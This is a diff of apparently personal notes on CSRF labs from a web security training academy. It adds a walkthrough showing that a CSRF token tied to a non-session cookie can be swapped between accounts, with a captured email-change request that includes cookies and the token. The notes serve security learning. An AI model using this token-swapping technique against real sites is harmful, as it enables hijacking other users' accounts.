@@ -252,16 +252,44 @@
     email=Victom%40gmail.com&csrf=Oi7rHvtd7DOqsEEGicPXo4LBMidJEYcD
  
  
-  Copy the csrf token Privilege account, and past the normal use csrf token 
+  Copy the csrf token Privilege account, and past the normal use csrf token, sand the to request server, Server is accept the request, This is vulnerable
   
-  And book Hack
  
  
  
+  ## 5 CSRF where token is tied to non-session cookie
+  
+  Find CSRF vulnerability
+  
+  Email change functionality is vulnerable to CSRF
+  
+  Burp intercept request and manualy review
  
+  You have two accounts on the application that you can use to help design your attack
  
+ Observe that if you swap the csrfKey cookie and csrf parameter from the first account to the second account, the request is accepted. this is vulnerable
  
- 
+     POST /my-account/change-email HTTP/1.1
+Host: 0a46002a0304dbd3c03a186b00050036.web-security-academy.net
+Cookie: session=ABcCuqstyngyux2QNIm9mq260r2zi58z; csrfKey=mVCTxe6SETdHTB59NX7izfWGmQbCJtGt
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 60
+Origin: https://0a46002a0304dbd3c03a186b00050036.web-security-academy.net
+Dnt: 1
+Referer: https://0a46002a0304dbd3c03a186b00050036.web-security-academy.net/my-account
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
+
+email=nasir%40khan.com&csrf=G0zc7n3MlHSGvkIl3ji5OrCz4MEZQtKv
  
  
  
